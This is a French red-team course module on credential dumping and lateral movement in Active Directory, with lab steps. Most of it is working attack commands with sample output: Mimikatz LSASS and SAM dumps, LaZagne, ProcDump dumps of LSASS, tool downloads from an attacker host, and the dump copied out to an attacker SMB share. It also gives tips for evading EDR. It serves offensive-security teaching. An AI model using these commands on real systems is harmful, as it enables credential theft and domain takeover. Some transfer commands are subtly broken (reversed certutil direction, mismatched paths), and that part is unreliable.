# Module 8 — Élévation de Privilèges & Lateral Movement

---

**Formation Red Team — SDV M2 2026**  
**Durée estimée : 1 h (cours) + 2 h (TP)**

---

## Table des matières

1. [Introduction au Lateral Movement (TA0008)](#1-introduction-au-lateral-movement-ta0008)
2. [Credential Dumping (T1003)](#2-credential-dumping-t1003)
3. [Pass-the-Hash (PtH — T1550.002)](#3-pass-the-hash-pth--t1550002)
4. [Pass-the-Ticket (PtT — T1550.003)](#4-pass-the-ticket-ptt--t1550003)
5. [Overpass-the-Hash (T1550.002)](#5-overpass-the-hash-t1550002)
6. [Mouvement latéral : PsExec, WMI, WinRM, Schtasks](#6-mouvement-latéral--psexec-wmi-winrm-schtasks)
7. [DCSync (T1003.006)](#7-dcsync-t1003006)
8. [Kerberoasting (T1558.003)](#8-kerberoasting-t1558003)
9. [AS-REP Roasting (T1558.004)](#9-as-rep-roasting-t1558004)
10. [TP Synthèse : De Local Admin à Domain Admin](#10-tp-synthèse--de-local-admin--domain-admin)
11. [Annexes](#11-annexes)

---

## 1. Introduction au Lateral Movement (TA0008)

### 1.1 Qu'est-ce que le Lateral Movement ?

Le **Lateral Movement** (déplacement latéral) est la tactique MITRE ATT&CK TA0008 qui regroupe les techniques permettant à un attaquant de se **déplacer d'un système compromis à un autre** sur le réseau. L'objectif est de progresser dans l'infrastructure cible jusqu'à atteindre les actifs critiques.

Contrairement à une idée reçue, le lateral movement n'est pas une technique en soi, mais **une phase entière du kill chain** qui s'appuie sur de nombreuses sous-techniques :

| Phase | Action | Exemple |
|---|---|---|
| Compromission initiale | Accès à un premier poste | Phishing, exploit web |
| Élévation locale | Passer de user → admin local | Exploit kernel, UAC bypass |
| Credential access | Voler des identifiants | Mimikatz, keylogging |
| Mouvement latéral | Utiliser ces identifiants ailleurs | PtH, PsExec, WMI |
| Objectif | Atteindre le DC ou les données | DCSync, dump de base |

### 1.2 Chaîne typique de compromission

La chaîne complète d'une attaque avec lateral movement suit généralement ce schéma :

```
[Poste employé] ──(Phishing)──> [User compromise]
       │
       ├── Élévation locale ──> [Admin local]
       │
       ├── Credential Dump ──> [Hash NTLM + Tickets Kerberos]
       │
       ├── Pass-the-Hash ──> [Serveur Fichier]
       │       │
       │       ├── Credential Dump ──> [Hash Admin domaine]
       │       │
       │       └── Pass-the-Ticket ──> [Contrôleur de domaine]
       │
       └── DCSync ──> [Tous les hashs du domaine]
```

Chaque étape correspond à au moins une technique MITRE ATT&CK :

| Étape | Technique | Code |
|---|---|---|
| Vol d'identifiants en mémoire | OS Credential Dumping | T1003 |
| Utilisation de comptes valides | Valid Accounts | T1078 |
| Passage avec hash | Use Alternate Authentication Material | T1550 |
| Réplication de l'annuaire | DCSync (sub de T1003) | T1003.006 |
| Exécution distante | Remote Services | T1021 |

### 1.3 Techniques clés de TA0008

#### T1003 — OS Credential Dumping

L'extraction des identifiants du système d'exploitation est le **prérequis indispensable** à la plupart des mouvements latéraux. Les sous-techniques incluent :

| Sous-technique | Cible | Outil |
|---|---|---|
| T1003.001 | LSASS Memory (processus) | Mimikatz, ProcDump |
| T1003.002 | Security Account Manager (SAM) | Mimikatz lsadump::sam |
| T1003.003 | NTDS (Contrôleur de domaine) | secretsdump.py |
| T1003.006 | DCSync (via MS-DRSR) | Mimikatz lsadump::dcsync |

#### T1078 — Valid Accounts

L'utilisation de comptes valides est la technique la plus simple et la plus furtive pour le lateral movement. L'attaquant utilise des identifiants légitimes (volés, crackés, ou par défaut) pour s'authentifier.

| Sous-technique | Description |
|---|---|
| T1078.001 | Default Accounts — comptes par défaut (Administrateur, Guest) |
| T1078.002 | Domain Accounts — comptes domaine volés |
| T1078.003 | Local Accounts — comptes locaux |
| T1078.004 | Cloud Accounts — comptes Azure / AWS |

#### T1550 — Use Alternate Authentication Material

Cette technique regroupe l'utilisation de matériel d'authentification alternatif (hash, ticket, certificat) au lieu du mot de passe en clair.

| Sous-technique | Description | Outil |
|---|---|---|
| T1550.001 | Application Access Token — jetons OAuth | AzCopy, Cloud APIs |
| T1550.002 | Pass-the-Hash — hash NTLM | impacket-psexec, crackmapexec |
| T1550.003 | Pass-the-Ticket — ticket Kerberos | Mimikatz, Rubeus |
| T1550.004 | Web Session Cookie — cookie de session | Cookie editor, impacket |

### 1.4 NIS2 et détection des mouvements latéraux

La directive **NIS2 (UE 2022/2555)** impose aux entités essentielles et importantes de détecter les mouvements latéraux. L'article 23 exige une notification des incidents en 24h, ce qui implique une capacité de détection précoce.

**Exigences NIS2 applicables au lateral movement :**

| Article | Exigence | Mapping ATT&CK |
|---|---|---|
| Art. 21(2)(c) | Détection des incidents | TA0008 (Lateral Movement) |
| Art. 21(2)(d) | Continuité des services | Protection des DC contre le DCSync |
| Art. 23(1) | Notification 24h | Alerte précoce sur T1003 |
| Art. 23(3) | Rapport 72h | Qualification des TTPs utilisées |
| Art. 27 | Sanctions | Preuve de couverture ATT&CK |

**Indicateurs de compromission (IoCs) pour le lateral movement :**

```yaml
title: Suspicious Pass-the-Hash Activity
id: 8c9e3e5f-2b1a-4c8d-9f6e-7a3b2c1d0e5f
status: experimental
description: Détecte les connexions avec logon type 9 (NewCredentials) depuis un même compte source
references:
  - https://attack.mitre.org/techniques/T1550/002/
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 9
    LogonProcess: 'Seclogo'
  condition: selection
falsepositives:
  - Utilisation légitime de RunAs / NetOnly
level: high
```

**Mesures de détection NIS2 recommandées :**

1. **Alertes sur EventID 4624 (Logon Type 3 + NTLM) pour les connexions inhabituelles**
2. **Détection des requêtes DRSR (DCSync) via le journal 4662**
3. **Surveillance des tickets Kerberos demandés pour des comptes de service (Kerberoasting)**
4. **Corrélation entre les sessions : un même compte se connectant à +10 machines en 5 minutes**

---

## 2. Credential Dumping (T1003)

### 2.1 Présentation

Le **Credential Dumping** (T1003) est la technique d'extraction des identifiants stockés sur un système. Sous Windows, les principaux réservoirs d'identifiants sont :

| Réservoir | Contenu | Accès |
|---|---|---|
| **LSASS** (Local Security Authority Subsystem Service) | Sessions ouvertes, hashs NTLM, tickets Kerberos | Administrateur local (ou SYSTEM) |
| **SAM** (Security Account Manager) | Hashs des comptes locaux | Administrateur local |
| **NTDS.dit** | Base de comptes du domaine | Admin domaine (ou DCSync) |
| **LSA Secrets** | Mots de passe des services, DPAPI | SYSTEM |
| **Vault** (Credential Manager) | Mots de passe enregistrés | Utilisateur connecté |

### 2.2 Mimikatz

**Mimikatz** est l'outil de référence pour l'extraction d'identifiants sous Windows. Développé par Benjamin Delpy (gentilkiwi), il est capable de :

- Extraire les hashs NTLM de la mémoire LSASS
- Extraire les mots de passe en clair (si configuration adéquate)
- Extraire les tickets Kerberos
- Manipuler les tickets (injection, export)
- Effectuer des attaques DCSync
- Extraire les secrets LSA et DPAPI

#### Installation et prérequis

```powershell
# Téléchargement du dépôt Mimikatz depuis GitHub (Benjamin Delpy / gentilkiwi)
git clone https://github.com/gentilkiwi/mimikatz.git
# Se déplacer dans le répertoire cloné pour y travailler
cd mimikatz

# Mimikatz nécessite des privilèges élevés (Administrateur ou SYSTEM) pour accéder
# à la mémoire protégée de LSASS. Sans elevation, la plupart des commandes échouent.
# Lancement :
mimikatz.exe

# Demande le privilège SeDebugPrivilege (nécessaire pour ouvrir le processus LSASS
# en lecture). Retourne "Privilège '20' OK" si réussi.
mimikatz # privilege::debug
# Élève le token d'accès du processus courant au niveau SYSTEM (plus élevé
# qu'Administrateur). Permet d'accéder à LSASS même protégé.
mimikatz # token::elevate
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `git clone https://github.com/gentilkiwi/mimikatz.git` | Clone le dépôt officiel de Mimikatz depuis GitHub |
| `cd mimikatz` | Se place dans le dossier du projet pour exécuter les binaires |
| `mimikatz.exe` | Lance le binaire Mimikatz (nécessite une invite admin) |
| `privilege::debug` | Active le privilège SeDebugPrivilege pour ouvrir LSASS en accès processus |
| `token::elevate` | Élève le token au niveau SYSTEM (contourne les restrictions de LSASS) |

> **Note importante :** Mimikatz est massivement détecté par les antivirus et EDR modernes. En Red Team, il est souvent :
> - Chiffré (packer comme UPX, ConfuserEx)
> - Chargé en mémoire (reflective DLL injection)
> - Exécuté via des techniques de Living-off-the-Land (LOLBins)

#### sekurlsa::logonpasswords

La commande la plus célèbre de Mimikatz : extraire les mots de passe et hashs des sessions en cours dans LSASS.

```mimikatz
# Active le privilège de débogage (nécessaire pour ouvrir LSASS)
mimikatz # privilege::debug
# Extrait les identifiants (hashs NTLM, mots de passe en clair, tickets Kerberos)
# de toutes les sessions actives dans le sous-système LSASS.
mimikatz # sekurlsa::logonpasswords
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `privilege::debug` | Obtient SeDebugPrivilege pour lire la mémoire de LSASS |
| `sekurlsa::logonpasswords` | Parcourt les structures mémoire de LSASS et affiche les credentials de toutes les sessions : hashs NTLM (section `msv`), mots de passe en clair (sections `wdigest`, `kerberos`, `tspkg`, `ssp`), tickets Kerberos |

**Sortie typique :**

```
Authentication Id : 0 ; 1234567 (00000000:0012d687)
Session           : Interactive from 1
User Name         : jdupont
Domain            : CORP
SID               : S-1-5-21-123456789-1234567890-1234567890-1107

    msv :
     [00000003] Primary
     * Username : jdupont
     * Domain   : CORP
     * NTLM     : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
     * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
    tspkg :
     * Username : jdupont
     * Domain   : CORP
     * Password : MonSuperMotDePasse123!
    wdigest :
     * Username : jdupont
     * Domain   : CORP
     * Password : MonSuperMotDePasse123!
    kerberos :
     * Username : jdupont
     * Domain   : CORP.LOCAL
     * Password : MonSuperMotDePasse123!
    ssp :
     * Username : jdupont
     * Domain   : CORP.LOCAL
     * Password : MonSuperMotDePasse123!
```

**Détail des sections :**

| Section | Protocole | Contenu |
|---|---|---|
| **msv** | MSV1_0 | Hash NTLM (LM:NTLM) |
| **tspkg** | TS Package | Mot de passe en clair (si TS) |
| **wdigest** | WDigest | Mot de passe en clair (selon config) |
| **kerberos** | Kerberos | Mot de passe en clair (toutes sessions) |
| **ssp** | CredSSP | Mot de passe en clair |

> **Note WDigest :** Depuis Windows 8.1/2012 R2, WDigest est désactivé par défaut. Activation possible via le registre `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential` = 1.

#### lsadump::sam

Extraction des hashs du SAM (Security Account Manager) — comptes locaux uniquement.

```mimikatz
# Obtention des droits de débogage pour accéder à la base SAM
mimikatz # privilege::debug
# Élévation du token vers SYSTEM pour contourner les protections
mimikatz # token::elevate
# Lit et déchiffre la ruche SAM du registre (stockée dans HKLM\SAM)
# Affiche les hashs NTLM des comptes locaux (RID, nom, hash)
mimikatz # lsadump::sam
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `privilege::debug` | Active SeDebugPrivilege pour lire la mémoire du processus SAM |
| `token::elevate` | Élève le token au niveau SYSTEM (seul SYSTEM peut lire SAM directement) |
| `lsadump::sam` | Dump de la base SAM : affiche chaque compte local (RID 500 = Administrator, 501 = Guest, etc.) avec son hash NTLM |

**Sortie :**

```
Domain : CORP-PC01
SysKey : 7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d
Local SID : S-1-5-21-987654321-9876543210-9876543210

SAM Key : 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000003e8 (1000)
User : jdupont
  Hash NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

#### lsadump::lsa /patch

Extraction des secrets LSA (mots de passe des services, DPAPI, etc.).

```mimikatz
# Obtention des droits de débogage
mimikatz # privilege::debug
# Élévation vers SYSTEM (nécessaire pour lire les secrets LSA)
mimikatz # token::elevate
# Extraction des secrets LSA depuis la mémoire du processus LSASS.
# L'option /patch lit les secrets directement sans écrire sur le disque,
# ce qui est plus discret qu'un dump fichier.
mimikatz # lsadump::lsa /patch
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `privilege::debug` | Obtient SeDebugPrivilege |
| `token::elevate` | Élève le token vers SYSTEM |
| `lsadump::lsa /patch` | Extrait les secrets LSA (mots de passe de services, clés DPAPI, clé `NL$KM`, clé `DRA_Listener`) depuis LSASS en mémoire. `/patch` évite d'écrire un fichier sur le disque |

**Contenu typique extrait :**

| Secret | Description |
|---|---|
| `$MACHINE.ACC` | Compte machine (utilisé pour l'authentification du poste dans le domaine) |
| `DRA_Listener` | Secret de réplication (peut être utilisé pour DCSync) |
| `DPAPI_SYSTEM` | Clé de chiffrement DPAPI système |
| `NL$KM` | Clé de déchiffrement des hashs stockés |
| `SC_xxx` | Mots de passe des services Windows (très utile !) |

#### sekurlsa::ekeys

Extraction des clés Kerberos (AES256, AES128, RC4_HMAC) depuis LSASS.

```mimikatz
# Obtention des droits de débogage
mimikatz # privilege::debug
# Extrait les clés de chiffrement Kerberos pour chaque utilisateur connecté :
# aes256_hmac, aes128_hmac, rc4_hmac_nt, rc4_hmac_old.
# Ces clés permettent l'Overpass-the-Hash (conversion hash → TGT).
mimikatz # sekurlsa::ekeys
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `privilege::debug` | Active SeDebugPrivilege |
| `sekurlsa::ekeys` | Extrait les clés Kerberos de chaque session LSASS. Clés disponibles : `aes256_hmac` (AES-256, auth moderne), `aes128_hmac` (AES-128), `rc4_hmac_nt` (RC4/NTLM, utilisable pour PtH ou Overpass-the-Hash), `rc4_hmac_old` (compatibilité descendante) |

**Sortie :**

```
User: administrator
    aes256_hmac       : 6b7a8f9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f
    aes128_hmac       : 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
    rc4_hmac_nt       : 31d6cfe0d16ae931b73c59d7e0c089c0
    rc4_hmac_old      : 31d6cfe0d16ae931b73c59d7e0c089c0
    rc4_md4           : 31d6cfe0d16ae931b73c59d7e0c089c0
    rc4_hmac_nt_exp   : 31d6cfe0d16ae931b73c59d7e0c089c0
```

**Utilité des clés extraites :**

| Clé | Algorithme | Usage |
|---|---|---|
| `aes256_hmac` | AES-256 | Authentification Kerberos moderne (plus sécurisé) |
| `aes128_hmac` | AES-128 | Authentification Kerberos alternative |
| `rc4_hmac_nt` | RC4 (NTLM) | Pass-the-Hash, Kerberos RC4 |
| `rc4_hmac_old` | RC4 (ancien) | Compatibilité descendante |

#### kerberos::tickets

Extraction et exportation des tickets Kerberos depuis la session LSASS.

```mimikatz
# Obtention des droits de débogage pour accéder aux tickets en mémoire
mimikatz # privilege::debug
# Parcourt les tickets Kerberos stockés dans LSASS et les exporte
# dans des fichiers .kirbi dans le dossier courant.
# L'option /export sauvegarde chaque ticket sur le disque.
mimikatz # sekurlsa::tickets /export
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `privilege::debug` | Active SeDebugPrivilege |
| `sekurlsa::tickets /export` | Liste et exporte tous les tickets Kerberos (TGT et TGS) des sessions actives vers des fichiers `.kirbi`. Chaque ticket peut ensuite être injecté (Pass-the-Ticket) pour usurper l'identité de l'utilisateur |

**Fichiers exportés (dans le dossier de travail) :**

```
[0;12d687]-1-0-40a50000-jdupont@krbtgt-CORP.LOCAL.kirbi
[0;12d687]-2-0-40a50000-jdupont@cifs/FILESERVER.CORP.LOCAL.kirbi
[0;12d687]-3-0-40a50000-jdupont@ldap/DC01.CORP.LOCAL.kirbi
```

**Format des fichiers exportés :**

| Extension | Format | Usage |
|---|---|---|
| `.kirbi` | Format binaire Mimikatz (base64 with header) | Mimikatz |
| `.ccache` | Format MIT Credential Cache | Impacket, outils Linux |

**Conversion kirbi → ccache :**

```bash
# Convertit un ticket .kirbi (format Mimikatz) en .ccache (format MIT),
# utilisable par les outils impacket sur Linux
impacket-ticketConverter ticket.kirbi ticket.ccache
# Vérifie le type du fichier converti (doit afficher "Kerberos Credential Cache (v5)")
file ticket.ccache
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-ticketConverter ticket.kirbi ticket.ccache` | Convertit un ticket au format `.kirbi` (Mimikatz) vers `.ccache` (MIT Credential Cache, standard Linux). Le premier argument est le fichier source, le second le fichier de destination |
| `file ticket.ccache` | Affiche le type MIME du fichier pour confirmer que la conversion a réussi. Sortie attendue : `ticket.ccache: Kerberos Credential Cache (v5)` |

#### vault::cred

Extraction des identifiants stockés dans le **Credential Manager** (Gestionnaire d'identification) de Windows.

```mimikatz
# Obtention des droits de débogage
mimikatz # privilege::debug
# Extrait les credentials stockés dans le Windows Vault/Credential Manager
# (mots de passe enregistrés pour sites web, accès réseaux, etc.)
mimikatz # vault::cred
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `privilege::debug` | Active SeDebugPrivilege |
| `vault::cred` | Liste et affiche les identifiants stockés dans le Credential Manager de Windows (Web credentials, Windows credentials, certificate-based credentials). Complémentaire à sekurlsa car cible les credentials persistants, pas seulement les sessions actives |

### 2.3 LaZagne

**LaZagne** est un logiciel open source qui permet d'extraire les mots de passe stockés sur un système :
- Navigateurs (Chrome, Firefox, Edge, Opera, etc.)
- Clients mail (Outlook, Thunderbird)
- Bases de données (SQL Server Management Studio, etc.)
- Wi-Fi
- Applications internes (Git, SVN, etc.)

#### Utilisation

```powershell
# Lancement en mode "all" : extrait tous les mots de passe stockés sur le système
# (navigateurs, clients mail, WiFi, applications, bases de données, etc.)
lazagne.exe all

# Cible uniquement les mots de passe enregistrés dans les navigateurs
# (Chrome, Firefox, Edge, Opera, Brave, etc.)
lazagne.exe browsers

# Cible uniquement les profils WiFi stockés (clés de réseaux sans fil)
lazagne.exe wifi

# Cible les clients de messagerie (Outlook, Thunderbird, etc.)
lazagne.exe mails
# Cible les gestionnaires de bases de données (SQL Server Management Studio, etc.)
lazagne.exe databases
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `lazagne.exe all` | Lance une extraction complète de TOUS les mots de passe supportés par LaZagne (navigateurs + mails + WiFi + applications + bases de données + serveurs internes) |
| `lazagne.exe browsers` | Extrait uniquement les mots de passe des navigateurs web (Chrome, Firefox, Edge, Opera, Brave, IE) |
| `lazagne.exe wifi` | Extrait les clés WPA/WPA2 des profils WiFi stockés dans Windows |
| `lazagne.exe mails` | Extrait les mots de passe des clients email (Outlook, Thunderbird, IncrediMail, etc.) |
| `lazagne.exe databases` | Extrait les mots de passe des outils de base de données (SQL Server Management Studio, Oracle SQL Developer, etc.) |

**Sortie typique (mode all) :**

```
########### !!  LaZagne v2.4.3  !!  ############
!!! LAZAGNE: The Open Source Password Recovery !!!

[*] Running on: Windows 10.0.19045
[*] User: jdupont

------------------- Chrome passwords -------------------
[+] Password found !!!
URL: https://mail.corp.local
Login: jdupont@corp.local
Password: S3cr3tMail!

------------------- Firefox passwords -------------------
[+] Password found !!!
URL: https://intranet.corp.local
Login: admin_intranet
Password: AdminIntra2026!

------------------- WiFi passwords -------------------
[+] SSID: CORP-WIFI
Password: W1f1_C0rp_2026!
```

**Intérêt pour le lateral movement :** LaZagne permet de récupérer des mots de passe en clair que Mimikatz ne peut pas extraire (WDigest désactivé). Les mots de passe Wi-Fi sont particulièrement intéressants car ils permettent un accès réseau physique.

### 2.4 ProcDump + Mimikatz Offline

Lorsque Mimikatz est bloqué (EDR, AV), on peut utiliser **ProcDump** (outil Microsoft SysInternals légitime) pour dumper le processus LSASS, puis extraire les hashs offline sur une machine d'attaque.

#### Étape 1 : Dump de LSASS avec ProcDump

```powershell
# Dump du processus LSASS avec mémoire complète (-ma)
# -accepteula : accepte automatiquement la licence (évite popup interactif)
# lsass.exe : nom du processus à dumper
# lsass.dmp : fichier de sortie contenant le dump mémoire
procdump.exe -ma -accepteula lsass.exe lsass.dmp

# Alternative : trouver le PID de LSASS puis dumper par PID
tasklist /fi "imagename eq lsass.exe"
# Dump par PID (ex: 648 est le PID de lsass, à adapter)
# -ma : dump avec mémoire complète (obligatoire pour les hashs)
procdump.exe -ma 648 lsass.dmp
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `procdump.exe` | Outil Microsoft SysInternals légitime qui crée un dump mémoire d'un processus |
| `-ma` | Mini dump + mémoire complète (inclut les pages mémoire contenant les hashs NTLM et tickets Kerberos). Sans `-ma`, le dump serait trop petit et ne contiendrait pas les credentials |
| `-accepteula` | Accepte automatiquement la licence (évite l'interaction utilisateur, utile en script automatique) |
| `lsass.exe` | Processus cible : LSASS (Local Security Authority Subsystem Service) qui contient toutes les sessions authentifiées |
| `lsass.dmp` | Nom du fichier dump de sortie (plusieurs centaines de Mo) |
| `tasklist /fi "imagename eq lsass.exe"` | Filtre la liste des processus pour trouver le PID exact de lsass.exe |
| `procdump.exe -ma 648 lsass.dmp` | Dump du processus avec PID 648 (remplacer par le PID réel) |

**Paramètres :**

| Option | Signification |
|---|---|
| `-ma` | Mini dump + mémoire complète (nécessaire pour les hashs) |
| `-accepteula` | Accepte la licence sans popup |
| `lsass.exe` | Processus à dumper |
| `lsass.dmp` | Fichier de sortie |

#### Étape 2 : Extraction offline avec Mimikatz

Sur la machine d'attaque (Linux ou Windows) :

```bash
# Installation de Wine (couche de compatibilité Windows pour Linux)
# Permet d'exécuter Mimikatz.exe directement sur Linux sans machine Windows
sudo apt install wine
# Lance Mimikatz via Wine (interface en ligne de commande)
wine mimikatz.exe
```

```mimikatz
# Charge le dump LSASS (lsass.dmp) comme source de données pour Mimikatz
# au lieu du processus LSASS en direct. Permet le traitement offline.
mimikatz # sekurlsa::minidump lsass.dmp
# Extrait les hashs NTLM et mots de passe depuis le dump mémoire
mimikatz # sekurlsa::logonpasswords
# Extrait les clés Kerberos (AES, RC4) depuis le dump mémoire
mimikatz # sekurlsa::ekeys
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `sudo apt install wine` | Installe Wine (Wine Is Not an Emulator) sur la machine d'attaque Linux |
| `wine mimikatz.exe` | Exécute le binaire Windows Mimikatz via Wine sur Linux |
| `sekurlsa::minidump lsass.dmp` | Charge un fichier `.dmp` (dump de LSASS) comme source offline. Mimikatz lit alors les structures mémoire dans le fichier au lieu de LSASS en direct |
| `sekurlsa::logonpasswords` | Extrait les credentials depuis le dump chargé (identique à l'exécution en direct) |
| `sekurlsa::ekeys` | Extrait les clés Kerberos depuis le dump chargé |

#### Alternative : pypykatz (Python pur)

```bash
# Installation de pypykatz : bibliothèque Python pure qui extrait les credentials
# depuis des dumps LSASS. Avantage : fonctionne nativement sur Linux sans Wine.
pip install pypykatz

# Extraction des credentials depuis le dump LSASS (lsass.dmp)
# Commande : pypykatz lsa minidump <fichier_dump>
pypykatz lsa minidump lsass.dmp

# Extraction avec sortie en JSON (pour parsing automatique par des scripts)
# -o : spécifie le fichier de sortie
pypykatz lsa minidump lsass.dmp -o credentials.json
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `pip install pypykatz` | Installe pypykatz (bibliothèque Python pure, alternative légère à Mimikatz) |
| `pypykatz lsa minidump lsass.dmp` | Commande pypykatz : lit le fichier dump LSASS (`lsass.dmp`) et extrait tous les credentials (hashs NTLM, clés Kerberos, mots de passe en clair). `lsa` = module LSA, `minidump` = sous-commande pour fichier dump |
| `-o credentials.json` | Option de sortie : écrit les résultats au format JSON dans `credentials.json` pour réutilisation par des outils d'analyse automatisée |

**Avantage :** pypykatz est écrit en Python, ne nécessite pas Wine, et peut être exécuté sur n'importe quelle plateforme.

### 2.5 TP Guidé : Extraire les credentials d'une session Windows

#### Objectif

Depuis un poste Windows compromis avec droits administrateur local, extraire :
1. Les hashs NTLM de la session en cours
2. Les clés Kerberos
3. Les mots de passe des applications (LaZagne)
4. Un dump LSASS pour extraction offline

#### Prérequis

- Machine cible : Windows 10/11 ou Windows Server 2022
- Accès administrateur local
- Répertoire de travail : `C:\Windows\Temp\redteam\`

#### Étape 1 : Transfert des outils

```powershell
# --- Sur la machine d'attaque (Linux) ---
# Préparer les outils à servir (sur Kali) :
mkdir -p /tmp/tools
# Télécharger les binaires nécessaires (à faire une fois)
wget -O /tmp/tools/mimikatz.exe https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip 2>/dev/null || echo "Mimikatz : à télécharger manuellement"
# Puis servir :
python3 -m http.server 8000 --directory /tmp/tools/ &

# --- Sur la machine cible (Windows) ---
# Crée le répertoire de travail (C:\Windows\Temp est accessible en écriture
# par tout utilisateur et moins surveillé que les dossiers utilisateur)
mkdir C:\Windows\Temp\redteam
# Se positionne dans le répertoire de travail
cd C:\Windows\Temp\redteam

# Télécharge Mimikatz depuis le serveur HTTP de la machine d'attaque
# Invoke-WebRequest est l'équivalent PowerShell de wget/curl
Invoke-WebRequest -Uri "http://10.0.0.10:8000/mimikatz.exe" -OutFile "mimikatz.exe"
# Télécharge LaZagne pour l'extraction de mots de passe applicatifs
Invoke-WebRequest -Uri "http://10.0.0.10:8000/lazagne.exe" -OutFile "lazagne.exe"
# Télécharge ProcDump pour le dump offline de LSASS
Invoke-WebRequest -Uri "http://10.0.0.10:8000/procdump.exe" -OutFile "procdump.exe"
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `python3 -m http.server 8000 --directory /tools/` | Démarre un serveur HTTP éphémère sur le port 8000 servant le dossier `/tools/`. Alternative rapide sans installer Apache/Nginx |
| `mkdir C:\Windows\Temp\redteam` | Crée un dossier de travail dans `C:\Windows\Temp` (moins surveillé que le Bureau ou `%TEMP%` de l'utilisateur) |
| `Invoke-WebRequest -Uri "..." -OutFile "..."` | Applet PowerShell : télécharge un fichier depuis une URL HTTP. `-Uri` = source, `-OutFile` = destination. Alternative à `certutil`, `bitsadmin` ou `wget` |

#### Étape 2 : Extraction avec Mimikatz

```powershell
# Lance Mimikatz (en local, dans le dossier courant)
.\mimikatz.exe

# Demande le privilège SeDebugPrivilege (code 20) pour accéder à LSASS
# Sortie attendue : "Privilège '20' OK" → le privilège est activé
mimikatz # privilege::debug

# Élève le token du processus de Admin vers SYSTEM
# Sortie attendue : "Token d'élévation réussi"
mimikatz # token::elevate

# Extrait tous les identifiants des sessions LSASS
# Affiche les hashs NTLM (section msv), mots de passe en clair (wdigest, kerberos),
# et les tickets de chaque session active sur la machine
mimikatz # sekurlsa::logonpasswords
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `.\mimikatz.exe` | Lance l'exécutable Mimikatz présent dans le dossier courant |
| `privilege::debug` | Active SeDebugPrivilege pour ouvrir LSASS en lecture |
| `token::elevate` | Élève le token de processus au niveau SYSTEM |
| `sekurlsa::logonpasswords` | Extrait les hashs NTLM et mots de passe de toutes les sessions LSASS actives |

**Questions :**
1. Combien de sessions sont actives dans LSASS ?
2. Y a-t-il des mots de passe en clair disponibles ?
3. Quels protocoles (msv, tspkg, wdigest, kerberos) montrent les hashs ?

#### Étape 3 : Extraction des clés Kerberos

```mimikatz
# Extrait les clés de chiffrement Kerberos (AES256, AES128, RC4)
# de toutes les sessions LSASS. Ces clés permettront de faire
# de l'Overpass-the-Hash (convertir un hash RC4 en TGT Kerberos)
mimikatz # sekurlsa::ekeys
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `sekurlsa::ekeys` | Extrait les clés Kerberos pour chaque session : `aes256_hmac`, `aes128_hmac`, `rc4_hmac_nt`. Utilisées pour l'Overpass-the-Hash et l'authentification Kerberos sans mot de passe |

#### Étape 4 : Dump LSASS avec ProcDump

```powershell
# Se positionne dans le répertoire de travail
cd C:\Windows\Temp\redteam
# Dump du processus LSASS avec mémoire complète (-ma)
# -accepteula : accepte la licence automatiquement
# lsass.exe → source, lsass.dmp → fichier de sortie
.\procdump.exe -ma -accepteula lsass.exe lsass.dmp
# Vérifie que le fichier dump a été créé et affiche sa taille
dir lsass.dmp
# Le fichier doit faire plusieurs centaines de Mo (voire Go)
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `.\procdump.exe` | Outil SysInternals Microsoft pour créer un dump mémoire |
| `-ma` | Dump complet avec mémoire (inclut les pages contenant les hashs) |
| `-accepteula` | Accepte la licence automatiquement |
| `lsass.exe` | Processus à dumper (LSASS) |
| `lsass.dmp` | Fichier de sortie du dump |
| `dir lsass.dmp` | Vérifie la présence et la taille du fichier dump |

```bash
# === TRANSFERT DU FICHIER LSASS.DMP VERS KALI ===
# Méthode 1 — HTTP (recommandée) :
# Sur Kali (terminal 1) :
python3 -m http.server 8888 &
# Sur Windows (dans le shell distant) :
certutil -urlcache -f http://10.0.1.10:8888/lsass.dmp C:\Windows\Temp\lsass.dmp
# Sur Kali (terminal 2) :
wget http://10.0.1.10:8888/lsass.dmp -O /tmp/lsass.dmp

# Méthode 2 — SMB :
# Sur Kali :
impacket-smbserver -smb2support share /tmp &
# Sur Windows :
copy C:\Windows\Temp\lsass.dmp \\10.0.1.10\share\lsass.dmp
```

#### Étape 5 : Extraction offline (sur machine d'attaque Linux)

```bash
# Installation de pypykatz (Python pur, sans dépendance Wine)
pip install pypykatz
# Extraction des credentials depuis le dump LSASS transféré
# pypykatz lsa minidump <fichier.dmp>
pypykatz lsa minidump lsass.dmp
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
